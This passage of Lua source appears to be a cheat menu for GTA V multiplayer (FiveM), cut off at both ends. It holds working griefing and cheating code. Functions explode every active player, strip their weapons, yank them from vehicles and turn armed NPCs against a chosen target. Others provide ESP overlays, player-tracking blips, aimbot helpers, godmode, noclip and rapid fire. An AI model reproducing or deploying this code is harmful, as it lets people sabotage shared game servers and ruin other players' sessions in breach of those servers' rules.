            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function gp()
    local bB = 266.12
    local bC = -752.51
    local bD = 34.64
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function dealership()
    local bB = -15.32
    local bC = -1080.69
    local bD = 26.14
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function Ammunation()
    local bB = 19.22
    local bC = -1108.71
    local bD = 29.8
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function shopclothes()
    local bB = 428.61
    local bC = -799.89
    local bD = 29.49
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end

local function barber()
    local bB = -32.84
    local bC = -152.34
    local bD = 57.08
    if bB ~= '' and bC ~= '' and bD ~= '' then
        if
            IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
                GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
         then
            entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
        else
            entity = GetPlayerPed(-1)
        end
        if entity then
            SetEntityCoords(entity, bB + 0.5, bC + 0.5, bD + 0.5, 1, 0, 0, 1)
        end
    end
	
end


function MaxOut(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end

function engine(veh)
	SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)				
end

function engine1(veh)
                    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
                    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
                    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
                    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
                    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
                    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
                    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end



local function fixcar()
ShowInfo("~g~Car fixed!")
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
					SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
					SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
					Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
					
		end


local function FixVeh(veh)
    SetVehicleEngineHealth(veh, 1000)
    SetVehicleFixed(veh)
end

local function ExplodePlayer(target)
    local ped = GetPlayerPed(target)
    local coords = GetEntityCoords(ped)
    AddExplosion(coords.x + 1, coords.y + 1, coords.z + 1, 4, 100.0, true, false, 0.0)
end

local function ExplodeAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        ExplodePlayer(i)
    end
end


-- Thanks to Fallen#0811 for the idea
local function PedAttack(target, attackType)
    local coords = GetEntityCoords(GetPlayerPed(target))
    
    if attackType == 1 then weparray = allweapons
    elseif attackType == 2 then weparray = meleeweapons
    elseif attackType == 3 then weparray = pistolweapons
    elseif attackType == 4 then weparray = heavyweapons
    end
    
    for k in EnumeratePeds() do
        if k ~= GetPlayerPed(target) and not IsPedAPlayer(k) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) < 2000 then
            local rand = math.ceil(math.random(#weparray))
            if weparray ~= allweapons then GiveWeaponToPed(k, GetHashKey(weparray[rand][1]), 9999, 0, 1)
            else GiveWeaponToPed(k, GetHashKey(weparray[rand]), 9999, 0, 1) end
            ClearPedTasks(k)
            TaskCombatPed(k, GetPlayerPed(target), 0, 16)
            SetPedCombatAbility(k, 100)
            SetPedCombatRange(k, 2)
            SetPedCombatAttributes(k, 46, 1)
            SetPedCombatAttributes(k, 5, 1)
        end
    end
end


function ApplyShockwave(entity)
    local pos = GetEntityCoords(PlayerPedId())
    local coord = GetEntityCoords(entity)
    local dx = coord.x - pos.x
    local dy = coord.y - pos.y
    local dz = coord.z - pos.z
    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
    local distanceRate = (50 / distance) * math.pow(1.04, 1 - distance)
    ApplyForceToEntity(entity, 1, distanceRate * dx, distanceRate * dy, distanceRate * dz, math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), math.random() * math.random(-1, 1), true, false, true, true, true, true)
end

local function DoForceFieldTick(radius)
    local player = PlayerPedId()
    local coords = GetEntityCoords(PlayerPedId())
    local playerVehicle = GetPlayersLastVehicle()
    local inVehicle = IsPedInVehicle(player, playerVehicle, true)
    
    DrawMarker(28, coords.x, coords.y, coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, radius, radius, radius, 180, 80, 0, 35, false, true, 2, nil, nil, false)
    
    for k in EnumerateVehicles() do
        if (not inVehicle or k ~= playerVehicle) and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
            RequestControlOnce(k)
            ApplyShockwave(k)
        end
    end
    
    for k in EnumeratePeds() do
        if k ~= PlayerPedId() and GetDistanceBetweenCoords(coords, GetEntityCoords(k)) <= radius * 1.2 then
            RequestControlOnce(k)
            SetPedRagdollOnCollision(k, true)
            SetPedRagdollForceFall(k)
            ApplyShockwave(k)
        end
    end
end

local function DoRapidFireTick()
    DisablePlayerFiring(PlayerPedId(), true)
    if IsDisabledControlPressed(0, Keys["MOUSE1"]) then
        local _, weapon = GetCurrentPedWeapon(PlayerPedId())
        local wepent = GetCurrentPedWeaponEntityIndex(PlayerPedId())
        local camDir = GetCamDirFromScreenCenter()
        local camPos = GetGameplayCamCoord()
        local launchPos = GetEntityCoords(wepent)
        local targetPos = camPos + (camDir * 200.0)
        
        ClearAreaOfProjectiles(launchPos, 0.0, 1)
        
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
        ShootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, PlayerPedId(), true, true, 24000.0)
    end
end

local function StripPlayer(target)
    local ped = GetPlayerPed(target)
    RemoveAllPedWeapons(ped, false)
end

local function StripAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        StripPlayer(i)
    end
end

local function KickFromVeh(target)
    local ped = GetPlayerPed(target)
    if IsPedInAnyVehicle(ped, false) then
        ClearPedTasksImmediately(ped)
    end
end

local function KickAllFromVeh(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        KickFromVeh(i)
    end
end

local function CancelAnimsAll(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        ClearPedTasksImmediately(GetPlayerPed(plist[i]))
    end
end

local function RandomClothes(target)
    local ped = GetPlayerPed(target)
    SetPedRandomComponentVariation(ped, false)
    SetPedRandomProps(ped)
end

local function GiveAllWeapons(target)
    local ped = GetPlayerPed(target)
    for i = 0, #allweapons do
        GiveWeaponToPed(ped, GetHashKey(allweapons[i]), 9999, false, false)
    end
end

local function GiveAllPlayersWeapons(self)
    local plist = GetActivePlayers()
    for i = 0, #plist do
        if not self and i == PlayerId() then i = i + 1 end
        GiveAllWeapons(i)
    end
end

local function GiveWeapon(target, weapon)
    local ped = GetPlayerPed(target)
    GiveWeaponToPed(ped, GetHashKey(weapon), 9999, false, false)
end

local function GiveMaxAmmo(target)
    local ped = GetPlayerPed(target)
    for i = 1, #allweapons do
        AddAmmoToPed(ped, GetHashKey(allweapons[i]), 9999)
    end
end

local function TeleportToPlayer(target)
    local ped = GetPlayerPed(target)
    local pos = GetEntityCoords(ped)
    SetEntityCoords(PlayerPedId(), pos)
end

local function TeleportToWaypoint()
    local entity = PlayerPedId()
    if IsPedInAnyVehicle(entity, false) then
        entity = GetVehiclePedIsUsing(entity)
    end
    local success = false
    local blipFound = false
    local blipIterator = GetBlipInfoIdIterator()
    local blip = GetFirstBlipInfoId(8)
    
    while DoesBlipExist(blip) do
        if GetBlipInfoIdType(blip) == 4 then
            cx, cy, cz = table.unpack(Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()))--GetBlipInfoIdCoord(blip)
            blipFound = true
            break
        end
        blip = GetNextBlipInfoId(blipIterator)
        Wait(0)
    end
    
    if blipFound then
        local groundFound = false
        local yaw = GetEntityHeading(entity)
        
        for i = 0, 1000, 1 do
            SetEntityCoordsNoOffset(entity, cx, cy, ToFloat(i), false, false, false)
            SetEntityRotation(entity, 0, 0, 0, 0, 0)
            SetEntityHeading(entity, yaw)
            SetGameplayCamRelativeHeading(0)
            Wait(0)
            if GetGroundZFor_3dCoord(cx, cy, ToFloat(i), cz, false) then
                cz = ToFloat(i)
                groundFound = true
                break
            end
        end
        if not groundFound then
            cz = -300.0
        end
        success = true
    else
        ShowInfo('~r~Blip not found')
    end
    
    if success then
	ShowInfo("~g~Teleported!")
        SetEntityCoordsNoOffset(entity, cx, cy, cz, false, false, true)
        SetGameplayCamRelativeHeading(0)
        if IsPedSittingInAnyVehicle(PlayerPedId()) then
            if GetPedInVehicleSeat(GetVehiclePedIsUsing(PlayerPedId()), -1) == PlayerPedId() then
                SetVehicleOnGroundProperly(GetVehiclePedIsUsing(PlayerPedId()))
            end
        end
    end

end


local function ToggleGodmode(tog)
    local ped = PlayerPedId()
    SetEntityProofs(ped, tog, tog, tog, tog, tog)
    SetPedCanRagdoll(ped, not tog)
end

local function ToggleNoclip()
ShowInfo("Noclipping ~g~[ON]")
    Noclipping = not Noclipping
    if Noclipping then
        SetEntityVisible(PlayerPedId(), false, false)
    else
        SetEntityRotation(GetVehiclePedIsIn(PlayerPedId(), 0), GetGameplayCamRot(2), 2, 1)
        SetEntityVisible(GetVehiclePedIsIn(PlayerPedId(), 0), true, false)
        SetEntityVisible(PlayerPedId(), true, false)
    end
end

local function ToggleESP()
    ESPEnabled = not ESPEnabled
	local _,x,y = false, 0.0, 0.0
	
	Citizen.CreateThread(function()
		while ESPEnabled do
            local plist = GetActivePlayers()
            table.removekey(plist, PlayerId())
            for i = 1, #plist do
				local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
				_, x, y = GetScreenCoordFromWorldCoord(targetCoords.x, targetCoords.y, targetCoords.z)
			end
			Wait(ESPRefreshTime)
		end
	end)
	
	
    Citizen.CreateThread(function()
        while ESPEnabled do
            local plist = GetActivePlayers()
            table.removekey(plist, PlayerId())
            for i = 1, #plist do
                local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
                local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), targetCoords)
                if distance <= EspDistance then
                    local _, wephash = GetCurrentPedWeapon(GetPlayerPed(plist[i]), 1)
                    local wepname = GetWeaponNameFromHash(wephash)
                    local vehname = "On Foot"
                    if IsPedInAnyVehicle(GetPlayerPed(plist[i]), 0) then
                        vehname = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(GetPlayerPed(plist[i])))))
                    end
                    if wepname == nil then wepname = "Unknown" end
                    DrawRect(x, y, 0.008, 0.01, 0, 0, 255, 255)
                    DrawRect(x, y, 0.003, 0.005, 255, 0, 0, 255)
                    local espstring1 = "~b~ID: " .. GetPlayerServerId(plist[i]) .. "  |  ~b~Name: " .. GetPlayerName(plist[i]) .. "  |  ~b~Distance: " .. math.floor(distance)
                    local espstring2 = "~b~Weapon: " .. wepname .. "  |  ~b~Vehicle: " .. vehname
                    DrawTxt(espstring1, x - 0.05, y - 0.04, 0.0, 0.2)
                    DrawTxt(espstring2, x - 0.05, y - 0.03, 0.0, 0.2)
                end
            end
            Wait(0)
        end
    end)
end

function ToggleBlips()
    BlipsEnabled = not BlipsEnabled
    
    if not BlipsEnabled then
        for i = 1, #pblips do
            RemoveBlip(pblips[i])
        end
    else
        
        Citizen.CreateThread(function()
            pblips = {}
            while BlipsEnabled do
                local plist = GetActivePlayers()
                table.removekey(plist, PlayerId())
                for i = 1, #plist do
                    if NetworkIsPlayerActive(plist[i]) then
                        ped = GetPlayerPed(plist[i])
                        pblips[i] = GetBlipFromEntity(ped)
                        if not DoesBlipExist(pblips[i]) then
                            pblips[i] = AddBlipForEntity(ped)
                            SetBlipSprite(pblips[i], 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(pblips[i])
                            if not GetEntityHealth(ped) then 
                                if blipSprite ~= 274 then
                                    SetBlipSprite(pblips[i], 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then 
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(pblips[i], 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehClass == 16 then 
                                    if vehModel == GetHashKey("besra") or vehModel == GetHashKey("hydra")
                                        or vehModel == GetHashKey("lazer") then -- jet
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(pblips[i], 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(pblips[i], 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehClass == 14 then 
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(pblips[i], 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehModel == GetHashKey("insurgent") or vehModel == GetHashKey("insurgent2")
                                    or vehModel == GetHashKey("limo2") then 
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(pblips[i], 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif vehModel == GetHashKey("rhino") then 
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(pblips[i], 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], false)
                                    end
                                elseif blipSprite ~= 1 then 
                                    SetBlipSprite(pblips[i], 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                                end
                                
                                
                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(pblips[i], passengers)
                                else
                                    HideNumberOnBlip(pblips[i])
                                end
                            else
                                
                                
                                HideNumberOnBlip(pblips[i])
                                if blipSprite ~= 1 then
                                    SetBlipSprite(pblips[i], 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, pblips[i], true)
                                end
                            end
                            SetBlipRotation(pblips[i], math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(pblips[i], plist[i])
                            SetBlipScale(pblips[i], 0.85)
                            
                            
                            if IsPauseMenuActive() then
                                SetBlipAlpha(pblips[i], 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(PlayerPedId(), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(plist[i]), true))
                                distance = (math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1)) + 900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(pblips[i], distance)
                            end
                        end
                    end
                end
                Wait(0)
            end
        end)
    end
end

local function ShootAt(target, bone)
    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(), boneTarget, true)
end

local function ShootAt2(target, bone, damage)
    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
    local _, weapon = GetCurrentPedWeapon(PlayerPedId())
    ShootSingleBulletBetweenCoords(AddVectors(boneTarget, vector3(0, 0, 0.1)), boneTarget, damage, true, weapon, PlayerPedId(), true, true, 1000.0)
end

local function ShootAimbot(k)
